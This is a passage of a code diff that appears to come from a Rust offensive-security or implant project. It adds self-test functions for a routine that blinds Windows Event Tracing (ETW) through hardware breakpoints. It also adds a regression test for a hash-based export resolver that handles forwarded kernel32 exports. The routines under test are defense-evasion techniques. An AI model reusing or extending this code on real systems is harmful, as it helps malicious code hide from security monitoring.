+        crate::blind_hwbp::set_diag_enabled(false);
+        exit(0xB0);
+    }
+    diag_byte(b'1');
+
+    match crate::blind_hwbp::blind_etw_hwbp() {
+        Ok(slot) => {
+            diag_byte(b'S');
+            if crate::blind_hwbp::remove_hwbp(slot).is_ok() {
+                diag_byte(b'T');
+            }
+            if crate::blind_hwbp::active_count() == 0 {
+                diag_byte(b'U');
+            }
+            diag_byte(b'Z');
+            crate::blind_hwbp::set_diag_enabled(false);
+            exit(0xFF);
+        }
+        Err(e) => {
+            diag_byte(b's');
+            let bytes = e.as_bytes();
+            if !bytes.is_empty() {
+                diag_byte(bytes[0]);
+            }
+            crate::blind_hwbp::set_diag_enabled(false);
+            exit(0xC0);
+        }
+    }
+}
+
+/// Minimal no-op VEH handler — returns EXCEPTION_CONTINUE_SEARCH for every
+/// exception. Used by the forwarded-export regression test to register a VEH
+/// without depending on the HWBP handler.
+#[no_mangle]
+pub unsafe extern "system" fn noop_veh_handler(_ep: usize) -> i32 {
+    0 // EXCEPTION_CONTINUE_SEARCH
+}
+
+/// **Forwarded-export resolver regression test**.
+///
+/// Guards the two bugs that caused the hwbp_blind 0xC0000005 crash:
+///  1. `resolve::export_addr_by_hash_pub` sized the forwarder bounds check with
+///     `number_of_functions` (a count) instead of the export-directory *size*,
+///     so high-RVA forwarders escaped detection and were returned as raw
+///     string addresses → calling them AV'd.
+///  2. `resolve::resolve_forwarder` compared the forwarder's abbreviated module
+///     stem (`NTDLL`) against full loader names (`ntdll.dll`), which never
+///     matched → forwarders resolved to `None`.
+///
+/// This test resolves three forwarded kernel32 exports (`AddVectoredException-
+/// Handler` → `NTDLL.RtlAddVectoredExceptionHandler`, plus `Sleep` and
+/// `GetLastError` as control) and calls each. If any resolved address points at
+/// a forwarder *string* instead of code, the call AV's and the test fails. A
+/// successful run exits with the bitmask of the steps that completed:
+///   bit0 = `GetLastError` resolved + called
+///   bit1 = `Sleep` resolved + called
+///   bit2 = `AddVectoredExceptionHandler` resolved + called + removed
+/// Expect 0b111 = 7.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
+    let mut mask: u32 = 0;
+
+    // Control: GetLastError (often non-forwarded in kernel32).
+    if let Some(gle) = crate::resolve::export_addr(b"kernel32.dll", b"GetLastError") {
+        type FnGle = unsafe extern "system" fn() -> u32;
+        let f: FnGle = core::mem::transmute(gle);
+        let _ = f();
+        mask |= 1 << 0;
+    }
+
+    // Control: Sleep (frequently forwarded to kernelbase).
+    if let Some(slp) = crate::resolve::export_addr(b"kernel32.dll", b"Sleep") {
+        type FnSleep = unsafe extern "system" fn(u32);
+        let f: FnSleep = core::mem::transmute(slp);
+        f(0);
+        mask |= 1 << 1;
+    }
+
+    // The bug-1/bug-2 case: AddVectoredExceptionHandler forwards to
+    // NTDLL.RtlAddVectoredExceptionHandler at a high RVA. Before the fix this
+    // returned the forwarder *string* address → the call AV'd the process.
+    let Some(aveh) = crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
+        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler"))
+    else {
+        exit(mask);
+    };
+    type AddVEH = unsafe extern "system" fn(
+        usize,
+        unsafe extern "system" fn(usize) -> i32,
+    ) -> *mut core::ffi::c_void;
+    let f: AddVEH = core::mem::transmute(aveh);
+    let h = f(1, noop_veh_handler);
+    if !h.is_null() {
+        if let Some(rveh) = crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
+            .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler"))
+        {
+            type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+            let fr: RemoveVEH = core::mem::transmute(rveh);
+            fr(h);
+            mask |= 1 << 2;
+        }
+    }
+
+    exit(mask);
+}
+
